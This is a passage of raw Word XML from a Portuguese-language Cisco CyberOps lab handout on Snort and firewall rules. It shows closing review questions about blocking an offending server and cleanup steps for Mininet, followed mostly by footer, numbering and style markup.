        <w:pStyle w:val="BodyTextL50"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>O download foi bem sucedido desta vez? Explique.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DBC156" w14:textId="0716FFF5" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4694FD99" w14:textId="1B1A9B49" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD1AC00" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
      </w:pPr>
      <w:r>
        <w:t>O que seria uma abordagem mais agressiva, mas também válida, ao bloquear o servidor ofensivo?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5811661F" w14:textId="0DF5CE22" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
        <w:spacing w:after="720"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8791E6" w14:textId="5946CC92" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F4E7D8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00164274" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>Terminar e limpar o processo Mininet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6F014A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Navegue até o terminal usado para iniciar Mininet. Encerre o Mininet inserindo </w:t>
      </w:r>
      <w:r w:rsidRPr="00B957F6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>quit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> na janela principal do terminal da VM CyberOps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C915A15" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Depois de sair da Mininet, limpe os processos iniciados pela Mininet. Entre a senha </w:t>
      </w:r>
      <w:r w:rsidRPr="00B957F6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>cyberops</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> quando solicitado</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F39CE8A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00C8638D" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[analyst@secOps scripts]$ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">sudo mn –c </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B5682A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009C35C4" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">[sudo] password for analyst: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6607DE2D" w14:textId="73CDAA84" w:rsidR="00C162C0" w:rsidRPr="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="ConfigWindow"/>
      </w:pPr>
      <w:r>
        <w:t>Fim do documento</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00C162C0" w:rsidRPr="00CB6E0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F1C3B" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866233" w:rsidP="00710659">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="068ABE68" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866233"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7A208BE1" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866233" w:rsidP="00710659">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA32A6D" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866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A170E" w14:textId="3902356B" w:rsidR="00926CB2" w:rsidRPr="00882B63" w:rsidRDefault="008E00D5" w:rsidP="00E859E3">
    <w:pPr>
      <w:pStyle w:val="Rodap"/>
      <w:rPr>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00B31F19">
      <w:sym w:font="Symbol" w:char="F0E3"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:sdt>
      <w:sdtPr>
        <w:alias w:val="Comentários "/>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2F6DA2">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>aa</w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> Cisco e/ou suas afiliadas. Todos os direitos reservados. Página Pública da Cisco</w:t>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r w:rsidRPr="0090659A">
      <w:rPr>
        <w:b/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidRPr="0090659A">
      <w:rPr>
        <w:b/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r w:rsidRPr="0090659A">
      <w:rPr>
        <w:b/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="002F6DA2">
      <w:rPr>
        <w:b/>
        <w:noProof/>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2F6DA2">
      <w:rPr>
        <w:b/>
        <w:noProof/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>9</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17B13" w14:textId="0A3409BD" w:rsidR="00882B63" w:rsidRPr="00882B63" w:rsidRDefault="00882B63" w:rsidP="00E859E3">
    <w:pPr>
      <w:pStyle w:val="Rodap"/>
      <w:rPr>
        <w:szCs w:val="16"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00B31F19">
      <w:sym w:font="Symbol" w:char="F0E3"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:sdt>
      <w:sdt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2F6DA2">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>aa</w:t>
    </w:r>
    <w:r w:rsidR="007E6402">
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> Cisco e/ou suas afiliadas. Todos os direitos reservados. Página Pública da Cisco</w:t>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r w:rsidRPr="0090659A">
      <w:rPr>
        <w:b/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidRPr="0090659A">
      <w:rPr>
        <w:b/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r w:rsidRPr="0090659A">
      <w:rPr>
        <w:b/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="002F6DA2">
      <w:rPr>
        <w:b/>
        <w:noProof/>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2F6DA2">
      <w:rPr>
        <w:b/>
        <w:noProof/>
        <w:szCs w:val="16"/>
      </w:rPr>
      <w:t>9</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D7117" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866233" w:rsidP="00710659">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="71683321" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866233"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="1D305ED4" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="00866233" w:rsidP="00710659">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w14:paraId="63B2A250" w14:textId="77777777" w:rsidR="00866233" w:rsidRDefault="008662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rgo"/>
      <w:tag w:val=""/>
      <w:id w:val="-1711953976"/>
      <w:placeholder>
        <w:docPart w:val="D0A0047F9C244BA997070E2BCCA11C5E"/>
      </w:placeholder>
      <w:dataBinding w:prefixMappings="xmlns:ns0='http://purl.org/dc/elements/1.1/' xmlns:ns1='http://schemas.openxmlformats.org/package/2006/metadata/core-properties' " w:xpath="/ns1:coreProperties[1]/ns0:title[1]" w:storeItemID="{6C3C8BC8-F283-45AE-878A-BAB7291924A1}"/>
      <w:text/>
    </w:sdtPr>
    <w:sdtEndPr/>
    <w:sdtContent>
      <w:p w14:paraId="7C087182" w14:textId="77777777" w:rsidR="00926CB2" w:rsidRDefault="00CB6E06" w:rsidP="008402F2">
        <w:pPr>
          <w:pStyle w:val="PageHead"/>
        </w:pPr>
        <w:r>
          <w:t>Laboratório - Regras de Snort e Firewall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4364" w14:textId="77777777" w:rsidR="00926CB2" w:rsidRDefault="00882B63" w:rsidP="006C3FCF">
    <w:pPr>
      <w:ind w:left="-288"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
        <w:lang w:eastAsia="pt-BR"/>
      </w:rPr>
      <w:drawing>
        <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3E2941FC" wp14:editId="4FD53D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Etapa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D8C1B3C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7398136E"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Parte %1:"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Tarefa %2:"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="0"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Etapa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fa %2:"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="0" w:firstLine="0"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="2">
      <w:lvl w:ilvl="2">
        <w:start w:val="1"/>
        <w:numFmt w:val="decimal"/>
        <w:pStyle w:val="Ttulo3"/>
        <w:suff w:val="space"/>
        <w:lvlText w:val="Etapa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fa %2:"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="0" w:firstLine="0"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="2">
      <w:startOverride w:val="1"/>
      <w:lvl w:ilvl="2">
        <w:start w:val="1"/>
        <w:numFmt w:val="decimal"/>
        <w:pStyle w:val="Ttulo3"/>
        <w:suff w:val="space"/>
        <w:lvlText w:val="Etapa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2"/>
  </w:num>
  <w:num w:numId="11">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fa %2:"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="0" w:firstLine="0"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="2">
      <w:lvl w:ilvl="2">
        <w:start w:val="1"/>
        <w:numFmt w:val="decimal"/>
        <w:suff w:val="space"/>
        <w:lvlText w:val="Etapa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 w:numId="13">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fa %2:"/>
        <w:lvlJc w:val="left"/>
        <w:pPr>
          <w:ind w:left="0" w:firstLine="0"/>
        </w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:lvl>
    </w:lvlOverride>
    <w:lvlOverride w:ilvl="2">
      <w:lvl w:ilvl="2">
        <w:start w:val="1"/>
        <w:numFmt w:val="decimal"/>
        <w:suff w:val="space"/>
        <w:lvlText w:val="Etapa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685"/>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6DA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973"/>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F9C"/>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F12"/>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3D7"/>
    <w:rsid w:val="00656EEF"/>
    <w:rsid w:val="006576AF"/>
    <w:rsid w:val="0066013F"/>
    <w:rsid w:val="00672919"/>
    <w:rsid w:val="00676879"/>
    <w:rsid w:val="00677544"/>
    <w:rsid w:val="00681687"/>
    <w:rsid w:val="00683C8E"/>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8B"/>
    <w:rsid w:val="006C57F2"/>
    <w:rsid w:val="006C5949"/>
    <w:rsid w:val="006C6832"/>
    <w:rsid w:val="006D1370"/>
    <w:rsid w:val="006D2C28"/>
    <w:rsid w:val="006D3FC1"/>
    <w:rsid w:val="006D5F7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0E6"/>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3EB6"/>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233"/>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BE0"/>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4A0"/>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1887"/>
    <w:rsid w:val="00B957F6"/>
    <w:rsid w:val="00B97278"/>
    <w:rsid w:val="00B97943"/>
    <w:rsid w:val="00BA1D0B"/>
    <w:rsid w:val="00BA2B50"/>
    <w:rsid w:val="00BA6972"/>
    <w:rsid w:val="00BB1E0D"/>
    <w:rsid w:val="00BB26C8"/>
    <w:rsid w:val="00BB4D9B"/>
    <w:rsid w:val="00BB73FF"/>
    <w:rsid w:val="00BB7688"/>
    <w:rsid w:val="00BB7837"/>
    <w:rsid w:val="00BC3AD6"/>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6E06"/>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FA3"/>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A11"/>
    <w:rsid w:val="00DE6F44"/>
    <w:rsid w:val="00DF1B58"/>
    <w:rsid w:val="00E009DA"/>
    <w:rsid w:val="00E037D9"/>
    <w:rsid w:val="00E04927"/>
    <w:rsid w:val="00E11A48"/>
    <w:rsid w:val="00E130EB"/>
    <w:rsid w:val="00E162CD"/>
    <w:rsid w:val="00E17FA5"/>
    <w:rsid w:val="00E21BFE"/>
    <w:rsid w:val="00E21C88"/>
    <w:rsid w:val="00E223AC"/>
    <w:rsid w:val="00E26930"/>
    <w:rsid w:val="00E26AC2"/>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7B7"/>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11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E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B6E06"/>
    <w:pPr>
      <w:spacing w:before="60" w:after="60" w:line="276" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="BodyTextL25"/>
    <w:link w:val="Ttulo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har"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="0066013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h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h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h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h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har"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="240" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="8"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"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CF26E3"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:noProof/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo2Char">
    <w:name w:val="Título 2 Ch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6013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B6E06"/>
    <w:pPr>
      <w:spacing w:after="480"/>
      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Cabealho">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="CabealhoChar"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008402F2"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4680"/>
        <w:tab w:val="right" w:pos="9360"/>
      </w:tabs>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="CabealhoChar">
    <w:name w:val="Cabeçalho Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Cabealho"/>
    <w:rsid w:val="008402F2"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Rodap">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="Rodap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RodapChar">
    <w:name w:val="Rodapé Char"/>
    <w:link w:val="Rodap"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00E859E3"/>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odetexto"/>
    <w:next w:val="BodyTextL25"/>
    <w:qFormat/>
    <w:rsid w:val="0066013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emlista"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00457934"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="numbering" w:customStyle="1" w:styleId="LabList">
    <w:name w:val="Lab List"/>
    <w:basedOn w:val="Sem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semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000B2344"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodecomentrio">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextodecomentrioChar"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="000B2344"/>
    <w:rPr>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TextodecomentrioChar">
    <w:name w:val="Texto de comentário Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodecomentrio"/>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emlista"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00596998"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="3"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo4Char">
    <w:name w:val="Título 4 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo4"/>
    <w:rsid w:val="0066013F"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:bCs/>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:sz w:val="6"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo5Char">
    <w:name w:val="Título 5 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo5"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo6Char">
    <w:name w:val="Título 6 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo6"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo7Char">
    <w:name w:val="Título 7 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo7"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo8Char">
    <w:name w:val="Título 8 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo8"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:i/>
      <w:iCs/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo9Char">
    <w:name w:val="Título 9 Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Ttulo9"/>
    <w:semiHidden/>
    <w:rsid w:val="00BF76BE"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulo3Char">
    <w:name w:val="Título 3 Char"/>
    <w:link w:val="Ttulo3"/>
    <w:rsid w:val="00D531D0"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="22"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodenotadefim">
    <w:name w:val="endnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextodenotadefimChar"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TextodenotadefimChar">
    <w:name w:val="Texto de nota de fim Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodenotadefim"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodenotaderodap">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextodenotaderodapChar"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TextodenotaderodapChar">
    <w:name w:val="Texto de nota de rodapé Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodenotaderodap"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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Remissivo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remissivo">
    <w:name w:val="index heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Remissivo1"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textodemacro">
    <w:name w:val="macro"/>
    <w:link w:val="Textodemacro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demacroChar">
    <w:name w:val="Texto de macro Char"/>
    <w:basedOn w:val="Fontepargpadro"/>
    <w:link w:val="Textodemacro"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:lang w:val="pt-BR" w:eastAsia="en-US" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ndicedeautoridad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ndicedeilustra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tulodendicedeautoridades">
    <w:name w:val="toa heading"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="120" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman" w:cs="Arial"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="240"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="480"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="720"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:autoRedefine/>
    <w:semiHidden/>
    <w:rsid w:val="00231DCA"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="960"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsia="Times New Roman"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sumrio6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
